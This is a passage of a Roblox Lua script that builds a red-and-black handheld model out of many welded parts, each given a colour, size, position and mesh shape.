Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.200000003, 0.593003511, 0.200000003))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-1.90734863e-006, -1.18598497, 3.85409546, 0.999993443, 1.43051147e-006, 7.45057918e-008, 4.47034836e-008, 1.49011612e-007, 0.999998868, 1.43051147e-006, -0.999993384, 2.08616129e-007))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.741254449, 1, 0.741248071))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.200000003, 0.200000003, 0.200000003))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0, -2.59437418, -2.81639481, -0.999993324, -1.35600567e-006, 7.45057918e-008, -4.47034942e-008, -1.49011569e-007, 0.999998868, -1.34110451e-006, 0.999993265, 2.08616129e-007))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.741254449, 0.741254449, 0.741248071))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.200000003, 0.200000003, 0.200000003))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-1.90734863e-006, -1.55661559, 3.85409546, 0.999993443, 1.43051147e-006, 7.45057918e-008, 4.47034836e-008, 1.49011612e-007, 0.999998868, 1.43051147e-006, -0.999993384, 2.08616129e-007))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.741254449, 0.741254449, 0.741248071))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.200000003, 0.326151937, 0.296499252))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(3.8536377, 0.000444412231, -6.91413879e-006, -2.9802333e-008, -0.999999762, -0, 1, -2.98023402e-008, 0, 0, 0, 0.999999523))
mesh("CylinderMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.741254449, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.200000003, 0.200000003, 0.200000003))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-1.90734863e-006, 2.0013752, 3.85409546, -0.999993443, -5.94257529e-007, -4.47034836e-008, -2.98022105e-008, -6.0737176e-007, -0.999998927, 5.9425787e-007, -0.999993384, 6.66978679e-007))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.741254449, 0.741254449, 0.741248071))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.200000003, 0.296501756, 0.200000003))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-1.90734863e-006, -2.22374678, 3.85409546, 0.999993443, 1.43051147e-006, 7.45057918e-008, 4.47034836e-008, 1.49011612e-007, 0.999998868, 1.43051147e-006, -0.999993384, 2.08616129e-007))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.741254449, 1, 0.741248071))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really red","Part",Vector3.new(0.200000003, 0.200000003, 0.296499103))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(2.80853271, 0.000414848328, 3.47587585, 1.29208814e-007, -0.866024733, -0.499999523, 1, 2.00156606e-007, -8.8263846e-008, 1.76517091e-007, -0.499999642, 0.866024554))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.741254449, 0.741254449, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.200000003, 0.889505386, 0.200000003))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.00040435791, -1.87283707, -3.30593491, 0.999993205, 3.10420091e-006, 4.20707329e-006, 5.11838152e-006, -0.500021577, -0.86601007, -5.17362992e-007, 0.86601001, -0.500015497))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.741254449, 1, 0.741248071))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really red","Part",Vector3.new(0.200000003, 0.200000003, 0.296499103))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(3.15766907, 0.000414848328, -0.0542945862, 1.73149076e-007, -0.866024733, 0.499999464, 1, 1.09283768e-007, -1.57012991e-007, 8.13355285e-008, 0.499999583, 0.866024554))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.741254449, 0.741254449, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.296501786, 0.444752693, 0.200000003))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.000381469727, 0.518871069, 4.00193787, 0.999993443, 1.43051147e-006, 7.45057918e-008, 4.47034836e-008, 1.49011612e-007, 0.999998868, 1.43051147e-006, -0.999993384, 2.08616129e-007))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(1, 1, 0.741248071))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.200000003, 0.200000003, 0.200000003))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(3.15768051, 0.000414848328, 0.168071747, 1.73149047e-007, -0.866024673, 0.499999404, 1, 1.09283775e-007, -1.57012963e-007, 8.13355712e-008, 0.499999523, 0.866024494))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.741254449, 0.741254449, 0.741248071))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.200000003, 0.200000003, 1.77899528))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(2.9568634, 0.000414848328, 4.06890678, 1.29209454e-007, -0.866017103, -0.499994904, 0.99999994, 2.00155014e-007, -8.82613804e-008, 1.7651513e-007, -0.499995023, 0.866016924))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.741254449, 0.741254449, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.200000003, 0.200000003, 0.741247892))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(3.6042366, 0.000414848328, 1.40539384, 7.28354408e-008, -0.999999523, 2.98026634e-008, 1, 7.28354905e-008, -1.137834e-007, 1.13783528e-007, 2.9802635e-008, 0.999999285))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.741254449, 0.741254449, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really red","Part",Vector3.new(0.200000003, 0.200000003, 0.741247892))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(3.15763474, 0.000415802002, -0.721405029, 8.67096972e-008, -0.866025329, 0.499999881, 1, 3.44270887e-008, -1.13789923e-007, 8.13314571e-008, 0.5, 0.86602515))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.741254449, 0.741254449, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.200000003, 0.200000003, 0.741247892))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(2.95671082, 0.000415802002, 2.80871201, 4.27689706e-008, -0.86602515, -0.499999851, 0.999999762, 1.25296964e-007, -1.31482579e-007, 1.76515783e-007, -0.499999851, 0.866025209))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.741254449, 0.741254449, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really red","Part",Vector3.new(0.200000003, 0.200000003, 0.592998326))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(3.15768814, 0.000414848328, 0.538698196, 1.73149076e-007, -0.866024733, 0.499999464, 1, 1.09283768e-007, -1.57012991e-007, 8.1335557e-008, 0.499999583, 0.866024554))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.741254449, 0.741254449, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really red","Part",Vector3.new(0.200000003, 0.593003631, 0.200000003))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.000418663025, -4.66182327, -2.80873108, 0.999993205, -2.08179517e-006, 4.68745384e-006, 5.02319881e-006, 0.499976099, -0.866036355, -4.73424905e-007, 0.866031289, 0.499978751))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.741254449, 1, 0.741248071))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.200000003, 0.200000003, 0.741247892))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(3.30587387, 0.000415802002, -0.721378326, 8.67091714e-008, -0.866024256, 0.499999464, 0.999999046, 3.4425458e-008, -1.13791891e-007, 8.13342709e-008, 0.499999762, 0.86602515))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.741254449, 0.741254449, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really red","Part",Vector3.new(0.200000003, 0.200000003, 0.741247892))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(2.80846024, 0.000415802002, 2.8087101, 4.27693685e-008, -0.86602515, -0.499999851, 0.999999762, 1.25295941e-007, -1.31480022e-007, 1.76513069e-007, -0.499999851, 0.866025209))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.741254449, 0.741254449, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.200000003, 0.200000003, 0.200000003))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(3.15765762, 0.000414848328, -0.27664566, 1.73148948e-007, -0.866023302, 0.499998629, 1, 1.09283704e-007, -1.57012749e-007, 8.13356706e-008, 0.499998748, 0.866023123))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.741254449, 0.741254449, 0.741248071))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.200000003, 0.889505386, 0.200000003))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.000422477722, -5.40308189, -2.95698166, 0.999993205, -2.08179517e-006, 4.68745384e-006, 5.02319881e-006, 0.499976099, -0.866036355, -4.73424905e-007, 0.866031289, 0.499978751))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.741254449, 1, 0.741248071))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really red","Part",Vector3.new(0.200000003, 0.593003631, 0.200000003))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.000400543213, -1.13156891, -3.15768433, 0.999993205, 3.10420091e-006, 4.20707329e-006, 5.11838152e-006, -0.500021577, -0.86601007, -5.17362992e-007, 0.86601001, -0.500015497))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.741254449, 1, 0.741248071))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.200000003, 0.200000003, 0.200000003))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(2.80859375, 0.000414848328, 3.69829178, 1.29208786e-007, -0.866024613, -0.499999523, 1, 2.00156563e-007, -8.82638247e-008, 1.76517119e-007, -0.499999642, 0.866024435))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.741254449, 0.741254449, 0.741248071))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.741254389, 0.296501786, 0.889497578))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(3.55724716, 0.000415802002, 0.593008757, -2.98023437e-008, -1, -0, 1, -2.98023437e-008, 0, 0, 0, 0.999999762))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.200000003, 0.200000003, 0.200000003))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(2.80845261, 0.000414848328, 3.25345612, 1.29208672e-007, -0.866023123, -0.499998778, 0.999999762, 2.00156279e-007, -8.82637536e-008, 1.76517077e-007, -0.499998778, 0.866023183))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.741254449, 0.741254449, 0.741248071))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.200000003, 0.200000003, 1.77899528))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(3.30587006, 0.000414848328, 0.538694382, 1.73149331e-007, -0.866016984, 0.499995172, 0.99999994, 1.09285118e-007, -1.57010405e-007, 8.13343917e-008, 0.499995291, 0.866016805))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.741254449, 0.741254449, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really red","Part",Vector3.new(0.200000003, 0.200000003, 0.592998326))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(2.80862808, 0.000414848328, 4.06892586, 1.29208814e-007, -0.866024733, -0.499999523, 1, 2.00156606e-007, -8.8263846e-008, 1.76517119e-007, -0.499999642, 0.866024554))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.741254449, 0.741254449, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really red","Part",Vector3.new(0.200000003, 0.200000003, 0.200000003))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(9.53674316e-007, 2.89088011, 3.26107788, -0.999993324, -1.62995764e-006, 4.10754041e-007, -2.91542648e-007, 1.04308128e-007, -0.999998927, 1.61505602e-006, -0.999993324, -2.53319683e-007))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.741254449, 0.741254449, 0.741248071))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.200000003, 0.200000003, 0.200000003))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0, -2.89087987, -3.26107788, -0.999993324, -1.35600567e-006, 7.45057918e-008, -4.47034942e-008, -1.49011569e-007, 0.999998868, -1.34110451e-006, 0.999993265, 2.08616129e-007))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.741254449, 0.741254449, 0.741248071))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.296501815, 4.00277376, 0.200000003))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(3.81469727e-006, -0.00343322754, -0.573273778, 0.999997854, 1.29937892e-008, 1.07842467e-007, -1.29937483e-008, 0.999997437, 0, -1.07842268e-007, 5.96046448e-008, 0.999999464))
mesh("CylinderMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(1, 1, 0.741248071))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.200000003, 0.200000003, 0.200000003))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0, -1.26012194, -2.81639481, -0.999993324, -1.35600567e-006, 7.45057918e-008, -4.47034942e-008, -1.49011569e-007, 0.999998868, -1.34110451e-006, 0.999993265, 2.08616129e-007))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.741254449, 0.741254449, 0.741248071))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.200000003, 0.200000003, 0.200000003))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(1.90734863e-006, 0.815383554, -2.81639481, 0.999993205, 5.96046448e-007, -4.47034836e-008, 2.98021234e-008, 6.07371646e-007, -0.999998927, -5.96046448e-007, 0.999993205, 6.66978679e-007))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.741254449, 0.741254449, 0.741248071))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really red","Part",Vector3.new(0.200000003, 1.18600714, 0.592998505))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-9.53674316e-007, -1.03774309, 3.33521271, 0.999993443, 1.43051147e-006, 7.45057918e-008, 4.47034836e-008, 1.49011612e-007, 0.999998868, 1.43051147e-006, -0.999993384, 2.08616129e-007))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.741254449, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.200000003, 0.296501756, 0.200000003))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0, -1.0377425, -2.81639481, -0.999993324, -1.35600567e-006, 7.45057918e-008, -4.47034942e-008, -1.49011569e-007, 0.999998868, -1.34110451e-006, 0.999993265, 2.08616129e-007))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.741254449, 1, 0.741248071))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.200000003, 0.200000003, 0.592998505))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-9.53674316e-007, -1.70486319, 3.33521271, 0.999993443, 1.43051147e-006, 7.45057918e-008, 4.47034836e-008, 1.49011612e-007, 0.999998868, 1.43051147e-006, -0.999993384, 2.08616129e-007))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.741254449, 0.741254449, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.200000003, 1.0377562, 0.200000003))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-9.53674316e-007, -2.2978766, 3.26107407, 0.999993443, 1.43051147e-006, 7.45057918e-008, 4.47034836e-008, 1.49011612e-007, 0.999998868, 1.43051147e-006, -0.999993384, 2.08616129e-007))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.741254449, 1, 0.741248071))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.296501786, 0.200000003, 0.200000003))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(3.48348236, 3.81469727e-006, -2.2978785, -2.98023224e-008, -0.999999821, -0, 0.999999821, -2.98023224e-008, 0, 0, 0, 0.999999762))
mesh("CylinderMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(1, 0.815379977, 0.741248071))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really red","Part",Vector3.new(0.200000003, 0.200000003, 0.296499252))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-9.53674316e-007, -2.89088058, 3.48345947, 0.999993443, 1.43051147e-006, 7.45057918e-008, 4.47034836e-008, 1.49011612e-007, 0.999998868, 1.43051147e-006, -0.999993384, 2.08616129e-007))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.741254449, 0.741254449, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really red","Part",Vector3.new(0.200000003, 1.18600726, 0.200000003))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-9.53674316e-007, -2.37198853, 3.11284637, 0.999993443, 1.43051147e-006, 7.45057918e-008, 4.47034836e-008, 1.49011612e-007, 0.999998868, 1.43051147e-006, -0.999993384, 2.08616129e-007))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.741254449, 1, 0.741248071))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.296501786, 0.200000003, 0.200000003))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(3.48348236, 3.81469727e-006, -2.00137448, -2.98023224e-008, -0.999999821, -0, 0.999999821, -2.98023224e-008, 0, 0, 0, 0.999999762))
mesh("CylinderMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(1, 0.815379977, 0.741248071))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.296501786, 0.200000003, 0.200000003))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(3.48348236, 3.81469727e-006, -2.5943768, -2.98023224e-008, -0.999999821, -0, 0.999999821, -2.98023224e-008, 0, 0, 0, 0.999999762))
mesh("CylinderMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(1, 0.815379977, 0.741248071))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really red","Part",Vector3.new(0.200000003, 1.0377562, 0.296499252))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-9.53674316e-007, -2.29787683, 3.48345947, 0.999993443, 1.43051147e-006, 7.45057918e-008, 4.47034836e-008, 1.49011612e-007, 0.999998868, 1.43051147e-006, -0.999993384, 2.08616129e-007))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.741254449, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really red","Part",Vector3.new(0.200000003, 2.07551241, 0.592998505))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-9.53674316e-007, -4.00276041, 3.33521271, 0.999993443, 1.45976469e-006, 1.94331719e-007, -7.51218181e-008, 1.49011612e-007, 0.999998868, 1.45976469e-006, -0.999993384, 2.23517361e-007))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.815379918, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.200000003, 2.9650178, 0.889497638))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-9.53674316e-007, -4.4475174, 3.33521271, 0.999993443, 1.45976469e-006, 1.94331719e-007, -7.51218181e-008, 1.49011612e-007, 0.999998868, 1.45976469e-006, -0.999993384, 2.23517361e-007))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.741254449, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really red","Part",Vector3.new(0.311326861, 0.296501487, 0.326149136))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(3.81469727e-006, 2.00148392, -6.91413879e-006, 1, 0, 0, 0, 1, 0, 0, 0, 0.999999762))
mesh("CylinderMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(1, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really red","Part",Vector3.new(0.311326861, 1.33425784, 0.326149136))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(3.81469727e-006, 9.91821289e-005, -6.91413879e-006, 1, 0, 0, 0, 1, 0, 0, 0, 0.999999762))
mesh("CylinderMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(1, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really red","Part",Vector3.new(0.200000003, 2.9650178, 0.444748878))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-2.86102295e-006, -3.84435654, 4.01723862, 0.999993443, 1.59027059e-006, 2.6722384e-007, 2.68622188e-007, -0.258817196, 0.965924799, 1.57439217e-006, -0.965919495, -0.258818537))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.815379977, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really red","Part",Vector3.new(0.311326861, 0.296501487, 0.326149136))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(3.81469727e-006, -1.85279465, -6.91413879e-006, 1, 0, 0, 0, 1, 0, 0, 0, 0.999999762))
mesh("CylinderMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(1, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.200000003, 2.52026534, 0.200000003))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0, -1.70486307, 2.96461105, 0.999993443, 1.43051147e-006, 7.45057918e-008, 4.47034836e-008, 1.49011612e-007, 0.999998868, 1.43051147e-006, -0.999993384, 2.08616129e-007))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.741254449, 1, 0.741248071))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.200000003, 4.29927588, 0.741248131))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-2.86102295e-006, -4.5114727, 4.01726913, 0.999993443, 1.59027059e-006, 2.6722384e-007, 2.68622188e-007, -0.258817196, 0.965924799, 1.57439217e-006, -0.965919495, -0.258818537))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.741254449, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.326151937, 0.200000003, 0.355799079))
